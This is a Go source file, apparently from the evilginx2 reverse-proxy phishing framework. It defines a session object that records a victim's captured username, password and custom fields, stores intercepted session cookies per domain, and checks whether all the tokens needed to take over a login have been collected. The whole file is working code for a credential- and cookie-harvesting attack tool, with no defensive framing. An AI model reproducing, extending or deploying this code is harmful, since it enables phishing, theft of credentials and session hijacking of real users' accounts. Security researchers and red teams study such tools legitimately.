package core

import (
	"github.com/kgretzky/evilginx2/database"
)

type Session struct {
	Id            string
	Name          string
	Username      string
	Password      string
	Custom        map[string]string
	Params        map[string]string
	Tokens        map[string]map[string]*database.Token
	RedirectURL   string
	IsDone        bool
	IsAuthUrl     bool
	IsForwarded   bool
	RedirectCount int
	PhishLure     *Lure
}

func NewSession(name string) (*Session, error) {
	s := &Session{
		Id:            GenRandomToken(),
		Name:          name,
		Username:      "",
		Password:      "",
		Custom:        make(map[string]string),
		Params:        make(map[string]string),
		RedirectURL:   "",
		IsDone:        false,
		IsAuthUrl:     false,
		IsForwarded:   false,
		RedirectCount: 0,
		PhishLure:     nil,
	}
	s.Tokens = make(map[string]map[string]*database.Token)

	return s, nil
}

func (s *Session) SetUsername(username string) {
	s.Username = username
}

func (s *Session) SetPassword(password string) {
	s.Password = password
}

func (s *Session) SetCustom(name string, value string) {
	s.Custom[name] = value
}

func (s *Session) AddAuthToken(domain string, key string, value string, path string, http_only bool, authTokens map[string][]*AuthToken) bool {
	if _, ok := s.Tokens[domain]; !ok {
		s.Tokens[domain] = make(map[string]*database.Token)
	}
	if tk, ok := s.Tokens[domain][key]; ok {
		tk.Name = key
		tk.Value = value
		tk.Path = path
		tk.HttpOnly = http_only
	} else {
		s.Tokens[domain][key] = &database.Token{
			Name:     key,
			Value:    value,
			HttpOnly: http_only,
		}
	}

	tcopy := make(map[string][]AuthToken)
	for k, v := range authTokens {
		tcopy[k] = []AuthToken{}
		for _, at := range v {
			if !at.optional {
				tcopy[k] = append(tcopy[k], *at)
			}
		}
	}

	for domain, tokens := range s.Tokens {
		for tk, _ := range tokens {
			if al, ok := tcopy[domain]; ok {
				for an, at := range al {
					match := false
					if at.re != nil {
						match = at.re.MatchString(tk)
					} else if at.name == tk {
						match = true
					}
					if match {
						tcopy[domain] = append(tcopy[domain][:an], tcopy[domain][an+1:]...)
						if len(tcopy[domain]) == 0 {
							delete(tcopy, domain)
						}
						break
					}
				}
			}
		}
	}

	if len(tcopy) == 0 {
		return true
	}
	return false
}
